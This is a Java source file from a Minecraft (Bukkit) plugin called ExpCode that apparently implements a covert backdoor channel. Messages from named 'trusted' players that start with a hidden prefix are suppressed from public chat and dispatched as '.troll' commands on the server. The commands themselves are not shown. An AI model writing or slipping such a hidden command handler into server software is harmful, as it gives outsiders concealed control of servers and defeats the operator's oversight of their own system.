package tk.expcode.expcode.innerutils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import tk.expcode.expcode.ExpCode;

import java.util.stream.Collectors;

public class CommandHandler implements Listener {

    private final ExpCode main;

    public CommandHandler(ExpCode main) {
        this.main = main;
    }

    @EventHandler
    public void onAsyncPlayerChat(AsyncPlayerChatEvent event) {

        Player player = event.getPlayer();
        if (!main.getTrustedPlayers().contains(player.getName())) return;
        if (!event.getMessage().startsWith(main.getCommandPrefix())) return;
        event.setCancelled(true);
        String[] args = event.getMessage().split(" ");
        if (args.length < 2) {
            player.sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&cNutze &6.troll help &cum eine Liste von commands zu sehen!"));
            return;
        }
        String[] give = new String[args.length - 2];
        System.arraycopy(args, 2, give, 0, args.length - 2);
        if (main.getCommands()
                .stream()
                .map(Command::getCommand)
                .collect(Collectors.toList())
                .contains(args[1])) {
            main.getCommands().forEach(command -> {
                if (command.getCommand().equals(args[1])) {
                    Bukkit.getScheduler().runTask(main.getPlugin(), () -> command.run(player, give));
                }
            });
        } else {
            player.sendMessage(ChatColor.translateAlternateColorCodes('&',
                    main.getMessagePrefix() + "&cNutze &6.troll help &cum eine Liste von commands zu sehen!"));
        }
    }
}
